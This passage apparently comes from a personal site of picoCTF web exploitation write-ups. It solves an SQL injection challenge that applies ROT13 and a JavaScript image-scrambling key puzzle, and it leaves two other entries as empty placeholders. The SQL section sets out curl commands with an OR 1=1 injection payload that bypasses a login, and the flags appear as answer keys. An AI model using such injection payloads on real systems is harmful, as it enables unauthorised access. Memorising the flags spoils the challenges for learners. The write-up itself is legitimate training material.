                <div class="panel-heading">
                    <h3 class="panel-title">Admin Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
~~~

We can see the POST fields only pass the field "password" for aithentication in the SQL database.  We can query the login.php page:

~~~
$ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=test&debug=1"
<pre>password: test
SQL query: SELECT * FROM admin where password = 'grfg'
</pre><h1>Login failed.</h1> 
~~~

We can see the SQL query:

~~~sql
SELECT * FROM admin where password = 'grfg'
~~~

Attempting an OR injection, we cannot login:

~~~
$ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=' OR 1=1--&debug=1" 
<pre>password: ' OR 1=1--
SQL query: SELECT * FROM admin where password = '' BE 1=1--'
</pre>   
~~~

We can see the OR statement is replaced with BE but the integers and punctuation characters are unchanged.  This looks like a substitution cipher.  We can clarify the substitution with a long input:

~~~
$ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&debug=1" 
<pre>password: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
SQL query: SELECT * FROM admin where password = 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
</pre><h1>Login failed.</h1>      
~~~

We can see letter inputs are changed by 13, which is reflective (A=N, N=A).  Taking this substituted alphabet as an input we should get a normal alphabet returned:

~~~
$ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm&debug=1"
<pre>password: NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm
SQL query: SELECT * FROM admin where password = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
</pre><h1>Login failed.</h1>  
~~~

The OR statement is substituted by BE, we can enter a new password field using BE in place of OR:

~~~
$ curl "https://jupiter.challenges.picoctf.org/problem/29132/login.php" --data "password=' BE 1=1--test&debug=1"                                    
<pre>password: ' BE 1=1--test
SQL query: SELECT * FROM admin where password = '' OR 1=1--grfg'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}</p>
~~~

We get the flag picoCTF{3v3n_m0r3_SQL_06a9db19}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{3v3n_m0r3_SQL_06a9db19}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## JaWT Scratchpad

- Author: John Hammond
- 400 points

### Description

Check the admin scratchpad! https://jupiter.challenges.picoctf.org/problem/61864/ or http://jupiter.challenges.picoctf.org:61864.

### Hints

1. What is that cookie?
2. Have you heard of JWT?

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Solution here

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Java Script Kiddie

- Author: John Johnson
- 400 points

### Description

The image link appears broken... https://jupiter.challenges.picoctf.org/problem/17205 or http://jupiter.challenges.picoctf.org:17205

### Hints

1. This is only a JavaScript problem.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can visit the website and look at the source code:

~~~html
<html>
	<head>    
		<script src="jquery-3.3.1.min.js"></script>
		<script>
			var bytes = [];
			$.get("bytes", function(resp) {
				bytes = Array.from(resp.split(" "), x => Number(x));
			});

			function assemble_png(u_in){
				var LEN = 16;
				var key = "0000000000000000";
				var shifter;
				if(u_in.length == LEN){
					key = u_in;
				}
				var result = [];
				for(var i = 0; i < LEN; i++){
					shifter = key.charCodeAt(i) - 48;
					for(var j = 0; j < (bytes.length / LEN); j ++){
						result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
					}
				}
				while(result[result.length-1] == 0){
					result = result.slice(0,result.length-1);
				}
				document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
				return false;
			}
		</script>
	</head>
	<body>

		<center>
			<form action="#" onsubmit="assemble_png(document.getElementById('user_in').value)">
				<input type="text" id="user_in">
				<input type="submit" value="Submit">
			</form>
			<img id="Area" src=""/>
		</center>

	</body>
</html>
~~~

We can see a html form input and a javascript function, "assemble_png":

~~~js
var bytes = [];
$.get("bytes", function(resp) {
  bytes = Array.from(resp.split(" "), x => Number(x));
});

function assemble_png(u_in) {
  var LEN = 16;
  var key = "0000000000000000";
  var shifter;
  if (u_in.length == LEN) {
    key = u_in;
  }
  var result = [];
  for (var i = 0; i < LEN; i++) {
    shifter = key.charCodeAt(i) - 48;
    for (var j = 0; j < (bytes.length / LEN); j++) {
      result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
    }
  }
  while (result[result.length - 1] == 0) {
    result = result.slice(0, result.length - 1);
  }
  document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
  return false;
}
~~~

The html form passes the sttring "user_in" to tthe javascript method "assemble_png".  The "user_in" string is used to generate a key.  In the javascript, we can see the user_in string must be exactly 16 characters long to generate a key:

~~~js
  var LEN = 16;
  var key = "0000000000000000";
  var shifter;
  if (u_in.length == LEN) {
    key = u_in;
  }
~~~

This key is later used to scramble the image bytes.  A for loop iterates over the length of the key (16 characters) and reads the key character as a "shifter".  In effect, the image is split into chunks of 16 Bytes and the image is scrambled by iterating through the array indexes:

~~~js
  for (var i = 0; i < LEN; i++) {
    shifter = key.charCodeAt(i) - 48;
    for (var j = 0; j < (bytes.length / LEN); j++) {
      result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
    }
  }
~~~

By using the default key, the source image is not scrambled.  We can see the image is encoded in base64 and if run with the default key, we can copy the base64 string holding the local image data.

Base64 data:

~~~
V4JOvABUGp2P7/lS+NTvUsNQAc8NBgEAd/NJwU4khWxVAAAOALpEAADeAPMAGK6jfgCF/ImxeQoAAADtST8AZGAUA+A7qxByAAAARQBERJOJs25wSnnuQQEAnACbAF94AOniKE7C+CxUANANKUiKO6RiRwDRAGOwYXjKAIfANmVA/FFHzQrzhR4Wfe0DXVoqSd0ZcvMAdBYEAztLvHep3aG4sgJJSectDmNmmaayzjZ/VPC/3AqjUUDOgIRmxUh/7/1OXQgW78+Sb4/vG/McAK2fxDD3HFRiPzSr1tYa6f5Bam87Sf+Ub2dbFM7eRvzHoXz1vGZRn3euM77zN/Oc+Xx9Ao+/G3eLflgS96vjSEI2+wBQq5JxrQRP09jWendz4S0YNixMK/0F62j4YAjlyEtA6dkXVyj+u2u1yLXptVHnq6VS/sTvMytyqkn5MnLJikALy5vA+eIjvJzfKNlDS2QtXWapDSLFUK/SgInJpy2MUqs41BF+cYvlf9+1DwB03brb5jjpHw/5SneYLCniPCP9rGEgiemlI7VoUNk4us3UD0BR5uaZPvv7L5eNbCAZQQv9d8mT8wsf9+k2ftmIjb/iidWD72SRl5Z3fJ/Lvj8SqtKvet/fcnw7XfWxZA85P++lkA2VIMYnNDVxYVu6TFtKz4XQAPXx9Ul6wd+fUq/xn+fNGFxLC/dNN6oHX3+PYM/yjpni8l2jbrkavASyZp9hNTq6rO8GTtdBnFqWcM1JTJWjn/ItkxDSMf5SfsgePr7mAlartcW5hKqZUr+a65M3OVz8MM92v6r9NX9ej3rm/pqXujeghH45t9mBtV//I98yRk1rZMsRPaMR45O2uE9+7xxzn/5vWvoOzrmJu43n0/H5J2ODX9Iyk/Fff2fvcaXfpPUj54Sm3PHPQ7KUHZxewkrebgDza56t1tL5VEJrKADLiqQA8Qltk89VHcw=
~~~

Decoded as hex:

~~~
57824EBC00541A9D8FEFF952F8D4EF52C35001CF0D06010077F349C14E24856C5500000E00BA440000DE00F30018AEA37E0085FC89B1790A000000ED493F0064601403E03BAB1072000000450044449389B36E704A79EE4101009C009B005F7800E9E2284EC2F82C5400D00D29488A3BA4624700D10063B06178CA0087C0366540FC5147CD0AF3851E167DED035D5A2A49DD1972F300741604033B4BBC77A9DDA1B8B2024949E72D0E636699A6B2CE367F54F0BFDC0AA35140CE808466C5487FEFFD4E5D0816EFCF926F8FEF1BF31C00AD9FC430F71C54623F34ABD6D61AE9FE416A6F3B49FF946F675B14CEDE46FCC7A17CF5BC66519F77AE33BEF337F39CF97C7D028FBF1B778B7E5812F7ABE3484236FB0050AB9271AD044FD3D8D67A7773E12D18362C4C2BFD05EB68F86008E5C84B40E9D9175728FEBB6BB5C8B5E9B551E7ABA552FEC4EF332B72AA49F93272C98A400BCB9BC0F9E223BC9CDF28D9434B642D5D66A90D22C550AFD28089C9A72D8C52AB38D4117E718BE57FDFB50F0074DDBADBE638E91F0FF94A77982C29E23C23FDAC612089E9A523B56850D938BACDD40F4051E6E6993EFBFB2F978D6C2019410BFD77C993F30B1FF7E9367ED9888DBFE289D583EF64919796777C9FCBBE3F12AAD2AF7ADFDF727C3B5DF5B1640F393FEFA5900D9520C627343571615BBA4C5B4ACF85D000F5F1F5497AC1DF9F52AFF19FE7CD185C4B0BF74D37AA075F7F8F60CFF28E99E2F25DA36EB91ABC04B2669F61353ABAACEF064ED7419C5A9670CD494C95A39FF22D9310D231FE527EC81E3EBEE60256ABB5C5B984AA9952BF9AEB9337395CFC30CF76BFAAFD357F5E8F7AE6FE9A97BA37A0847E39B7D981B55FFF23DF32464D6B64CB113DA311E393B6B84F7EEF1C739FFE6F5AFA0ECEB989BB8DE7D3F1F92763835FD23293F15F7F67EF71A5DFA4F523E784A6DCF1CF43B2941D9C5EC24ADE6E00F36B9EADD6D2F954426B2800CB8AA400F1096D93CF551DCC
~~~

This can be imported into python and made into an integer array:

~~~py
import numpy as np

scrambled = "57824EBC00541A9D8FEFF952F8D4EF52C35001CF0D06010077F349C14E24856C5500000E00BA440000DE00F30018AEA37E0085FC89B1790A000000ED493F0064601403E03BAB1072000000450044449389B36E704A79EE4101009C009B005F7800E9E2284EC2F82C5400D00D29488A3BA4624700D10063B06178CA0087C0366540FC5147CD0AF3851E167DED035D5A2A49DD1972F300741604033B4BBC77A9DDA1B8B2024949E72D0E636699A6B2CE367F54F0BFDC0AA35140CE808466C5487FEFFD4E5D0816EFCF926F8FEF1BF31C00AD9FC430F71C54623F34ABD6D61AE9FE416A6F3B49FF946F675B14CEDE46FCC7A17CF5BC66519F77AE33BEF337F39CF97C7D028FBF1B778B7E5812F7ABE3484236FB0050AB9271AD044FD3D8D67A7773E12D18362C4C2BFD05EB68F86008E5C84B40E9D9175728FEBB6BB5C8B5E9B551E7ABA552FEC4EF332B72AA49F93272C98A400BCB9BC0F9E223BC9CDF28D9434B642D5D66A90D22C550AFD28089C9A72D8C52AB38D4117E718BE57FDFB50F0074DDBADBE638E91F0FF94A77982C29E23C23FDAC612089E9A523B56850D938BACDD40F4051E6E6993EFBFB2F978D6C2019410BFD77C993F30B1FF7E9367ED9888DBFE289D583EF64919796777C9FCBBE3F12AAD2AF7ADFDF727C3B5DF5B1640F393FEFA5900D9520C627343571615BBA4C5B4ACF85D000F5F1F5497AC1DF9F52AFF19FE7CD185C4B0BF74D37AA075F7F8F60CFF28E99E2F25DA36EB91ABC04B2669F61353ABAACEF064ED7419C5A9670CD494C95A39FF22D9310D231FE527EC81E3EBEE60256ABB5C5B984AA9952BF9AEB9337395CFC30CF76BFAAFD357F5E8F7AE6FE9A97BA37A0847E39B7D981B55FFF23DF32464D6B64CB113DA311E393B6B84F7EEF1C739FFE6F5AFA0ECEB989BB8DE7D3F1F92763835FD23293F15F7F67EF71A5DFA4F523E784A6DCF1CF43B2941D9C5EC24ADE6E00F36B9EADD6D2F954426B2800CB8AA400F1096D93CF551DCC"

int_arr = [0]*int(len(scrambled)/2)

for i in range(0,len(scrambled),2):
    hexstr = scrambled[i]+scrambled[i+1]
    int_arr[int(np.ceil(i/2))] = int(hexstr,16)
~~~

We can see from the javascript, the image is a PNG file.  From the [PNG Specification](http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html) we can identify the first 16 Bytes.

The first 8 Bytes are always 137 80 78 71 13 10 26 10.  This defines the file as a png.  The next 8 Bytes make the IHDR chunk: 0 0 13 73 72 68 82.  We can add a function in Python to return the indices of these numbers from the scrambled image byte array:

~~~py
def find_in_arr(num,arr):
    return [i for i, x in enumerate(arr) if x == num]
~~~

We can define the png header and identify the locations of these Bytes in Python:

~~~py
png_arr = [137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82]

for num in png_arr:
    print("Byte {} found in scrambled array at {}".format(num,find_in_arr(num,int_arr)))
~~~

This returns:

~~~
In [1]: runfile('java_kiddie_1.py')
Byte 137 found in scrambled array at [52, 80, 364, 405, 450, 653]
Byte 80 found in scrambled array at [17, 275, 360, 411]
Byte 78 found in scrambled array at [2, 28, 100, 194, 552]
Byte 71 found in scrambled array at [114, 131]
Byte 13 found in scrambled array at [20, 107, 357, 484]
Byte 10 found in scrambled array at [55, 133, 181]
Byte 26 found in scrambled array at [6, 221, 539]
Byte 10 found in scrambled array at [55, 133, 181]
Byte 0 found in scrambled array at [4, 23, 33, 34, 36, 39, 40, 42, 44, 49, 56, 57, 58, 62, 72, 73, 74, 76, 89, 91, 93, 96, 105, 115, 117, 123, 149, 207, 274, 382, 501, 694, 706, 710]
Byte 0 found in scrambled array at [4, 23, 33, 34, 36, 39, 40, 42, 44, 49, 56, 57, 58, 62, 72, 73, 74, 76, 89, 91, 93, 96, 105, 115, 117, 123, 149, 207, 274, 382, 501, 694, 706, 710]
Byte 13 found in scrambled array at [20, 107, 357, 484]
Byte 73 found in scrambled array at [26, 60, 144, 164, 165, 228, 331, 505, 560]
Byte 72 found in scrambled array at [109, 190, 270]
Byte 68 found in scrambled array at [38, 77, 78]
Byte 82 found in scrambled array at [11, 15, 323, 369, 510, 572, 588]
~~~

We have now found all occurances of the PNG 16 Byte header in the scrambled file:

| PNG Byte Index | Value | Count in file | Locations |
|----------------|-------|---------------|-----------|
| 0  | 137 | 6  | [52, 80, 364, 405, 450, 653] |
| 1  | 80  | 5  | [17, 275, 360, 411] |
| 2  | 78  | 5  | [2, 28, 100, 194, 552] |
| 3  | 71  | 2  | [114, 131] |
| 4  | 13  | 4  | [20, 107, 357, 484] |
| 5  | 10  | 3  | [55, 133, 181] |
| 6  | 26  | 3  | [6, 221, 539] |
| 7  | 10  | 3  | [55, 133, 181] |
| 8  | 0   | 34 | [4, 23, 33, 34, 36, 39, 40, 42, 44, 49, 56, 57, 58, 62, 72, 73, 74, 76, 89, 91, 93, 96, 105, 115, 117, 123, 149, 207, 274, 382, 501, 694, 706, 710] |
| 9  | 0   | 34 | [4, 23, 33, 34, 36, 39, 40, 42, 44, 49, 56, 57, 58, 62, 72, 73, 74, 76, 89, 91, 93, 96, 105, 115, 117, 123, 149, 207, 274, 382, 501, 694, 706, 710] |
| 10 | 0   | 34 | [4, 23, 33, 34, 36, 39, 40, 42, 44, 49, 56, 57, 58, 62, 72, 73, 74, 76, 89, 91, 93, 96, 105, 115, 117, 123, 149, 207, 274, 382, 501, 694, 706, 710] |
| 11 | 13  | 4  | [20, 107, 357, 484] |
| 12 | 73  | 9  | [26, 60, 144, 164, 165, 228, 331, 505, 560] |
| 13 | 72  | 3  | [109, 190, 270] |
| 14 | 68  | 3  | [38, 77, 78] |
| 15 | 82  | 7  | [11, 15, 323, 369, 510, 572, 588] |

This provides us with details of all possible locations of the first 16 Bytes from which we can generate possible keys by inverting the javascript method.  Due to the number of Bytes and replication, we may need to reduce the options, the above reduces the total number of possible keys from 5E30 to 13E11.  We still have a significantly high number of possibilities.

Let's look at the first Byte:

The position in the output array will be 0 therefore:

~~~js
result[(j * LEN) + i] = result[0]
~~~

We can infer that i=j=0.  Indeed for the first 16 Bytes, we can see that j=0.

The source Byte is:

~~~js
bytes[(((j + shifter) * LEN) % bytes.length) + i] = bytes[(shifter * 16) % 771] = bytes[x]
~~~

We can determine from the javascript that 0<=shifter<= 79.  We can generate an array of solutions in python:

~~~py
for i in range(0,80,1):
    mod_array[i] = (i*16)%771
~~~

Using the index list function, we can identify which of the locations in the table above will meet the solution. For example, to check the index 52 to see if this could be the solution, we use:

~~~py
mod_array.index(52)
~~~

This can be formalised in a python script:

~~~py
png_arr = [137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82]

mod_array = [0]*80

for i in range(-48,80,1):
    mod_array[i] = (i*16)%771
    
for i in range(0,len(png_arr),1):
    print("PNG Index {}, value {}.".format(i,png_arr[i]))
    mod_array = [0]*80
    for j in range(0,80,1):
        mod_array[j] = ((j*16)%771)+i
    solutions = find_in_arr(png_arr[i],int_arr)
    sol2 = []
    for sol in solutions:
        try:
            mod_array.index(sol)
            sol2.append(sol)
        except:
            pass
    print("{} Location found".format(len(sol2)))
    print("Locations = {}".format(sol2))
~~~

This returns:

~~~py
PNG Index 0, value 137.
1 Location found
Locations = [80]
PNG Index 1, value 80.
1 Location found
Locations = [17]
PNG Index 2, value 78.
2 Location found
Locations = [2, 194]
PNG Index 3, value 71.
1 Location found
Locations = [131]
PNG Index 4, value 13.
2 Location found
Locations = [20, 484]
PNG Index 5, value 10.
2 Location found
Locations = [133, 181]
PNG Index 6, value 26.
1 Location found
Locations = [6]
PNG Index 7, value 10.
1 Location found
Locations = [55]
PNG Index 8, value 0.
6 Location found
Locations = [40, 56, 72, 117, 149, 501]
PNG Index 9, value 0.
4 Location found
Locations = [57, 73, 89, 105]
PNG Index 10, value 0.
5 Location found
Locations = [23, 39, 42, 58, 74]
PNG Index 11, value 13.
1 Location found
Locations = [107]
PNG Index 12, value 73.
2 Location found
Locations = [60, 505]
PNG Index 13, value 72.
1 Location found
Locations = [109]
PNG Index 14, value 68.
1 Location found
Locations = [78]
PNG Index 15, value 82.
1 Location found
Locations = [15]
~~~

We can update the table:

| PNG Byte Index | Value | Solvable locations in file | Locations | Shifter |
|----------------|-------|---------------|-----------|---|
| 0  | 137 | 1  | [80] | 5 |
| 1  | 80  | 1  | [17] | 1 |
| 2  | 78  | 2  | [2, 194] | 0, 12 |
| 3  | 71  | 1  | [131] | 8 |
| 4  | 13  | 2  | [20, 484] | 1, 30 |
| 5  | 10  | 2  | [133, 181] | 8, 11 |
| 6  | 26  | 1  | [6] | 0 |
| 7  | 10  | 1  | [55] | 3 |
| 8  | 0   | 6  | [40, 56, 72, 117, 149, 501] | 2,3,4,55,57,79 |
| 9  | 0   | 4  | [57, 73, 89, 105] | 3,4,5,6 |
| 10 | 0   | 5  | [23, 39, 42, 58, 74] | 49, 50, 2, 3, 4 |
| 11 | 13  | 1  | [107] | 6 |
| 12 | 73  | 2  | [60, 505] | 3, 79 |
| 13 | 72  | 1  | [109] | 6 |
| 14 | 68  | 1  | [78] | 4 |
| 15 | 82  | 1  | [15] | 0 |

We have reduced the number of possible keys to 1920.

| Key Index | Integer                   | ASCII                          |
|-----------|---------------------------|--------------------------------|
| 0         | 53                        | "5"                            |
| 1         | 49                        | "1"                            |
| 2         | 48, 60                    | "0", "<"                       |
| 3         | 56                        | "8"                            |
| 4         | 49, 78                    | "1", "N"                       |
| 5         | 56, 59                    | "8", ":"                       |
| 6         | 48                        | "0"                            |
| 7         | 51                        | "3"                            |
| 8         | 50, 51, 52, 103, 105, 127 | "2", "3", "4", "g", "i", [DEL] |
| 9         | 51, 52, 53, 54            | "3", "4", "5", "6"             |
| 10        | 50, 51, 52, 97, 98        | "2", "3", "4", "a", "b"        |
| 11        | 54                        | "6"                            |
| 12        | 51, 127                   | "3", [DEL]                     |
| 13        | 54                        | "6"                            |
| 14        | 52                        | "4"                            |
| 15        | 0                         | "0"                            |

We can reduce the number of feasoble passwords by removing characters that cannot be parsed by the web form:

| Key Index | Integer                   | ASCII                          |
|-----------|---------------------------|--------------------------------|
| 0         | 53                        | "5"                            |
| 1         | 49                        | "1"                            |
| 2         | 48, 60                    | "0", "<"                       |
| 3         | 56                        | "8"                            |
| 4         | 49, 78                    | "1", "N"                       |
| 5         | 56, 59                    | "8", ":"                       |
| 6         | 48                        | "0"                            |
| 7         | 51                        | "3"                            |
| 8         | 50, 51, 52, 103, 105      | "2", "3", "4", "g", "i"        |
| 9         | 51, 52, 53, 54            | "3", "4", "5", "6"             |
| 10        | 50, 51, 52, 97, 98        | "2", "3", "4", "a", "b"        |
| 11        | 54                        | "6"                            |
| 12        | 51                        | "3",                           |
| 13        | 54                        | "6"                            |
| 14        | 52                        | "4"                            |
| 15        | 0                         | "0"                            |

This reduces the number of feasible passwords to 800.  We can further simplify if we assume the password is constructed of integers only:

| Key Index | Integer                   | ASCII                          |
|-----------|---------------------------|--------------------------------|
| 0         | 53                        | "5"                            |
| 1         | 49                        | "1"                            |
| 2         | 48                        | "0"                            |
| 3         | 56                        | "8"                            |
| 4         | 49                        | "1"                            |
| 5         | 56                        | "8"                            |
| 6         | 48                        | "0"                            |
| 7         | 51                        | "3"                            |
| 8         | 50, 51, 52                | "2", "3", "4"                  |
| 9         | 51, 52, 53, 54            | "3", "4", "5", "6"             |
| 10        | 50, 51, 52                | "2", "3", "4"                  |
| 11        | 54                        | "6"                            |
| 12        | 51                        | "3",                           |
| 13        | 54                        | "6"                            |
| 14        | 52                        | "4"                            |
| 15        | 0                         | "0"                            |

This reduces it to 36 possible passwords.

Iterating through these passwords, we find the correct passphrase is: 5108180345363640

This descrambles the png and gives us a QR code.  Using QR scanner, we are able to retrieve the flag: picoCTF{066cad9e69c5c7e5d2784185c0feb30b}

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{066cad9e69c5c7e5d2784185c0feb30b}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Java Script Kiddie 2

- Author: John Johnson
- 450 points

### Description

The image link appears broken... twice as badly... https://jupiter.challenges.picoctf.org/problem/51400 or http://jupiter.challenges.picoctf.org:51400

### Hints

1. This is only a JavaScript problem.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Solution here

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## [djm89uk.github.io](https://djm89uk.github.io)
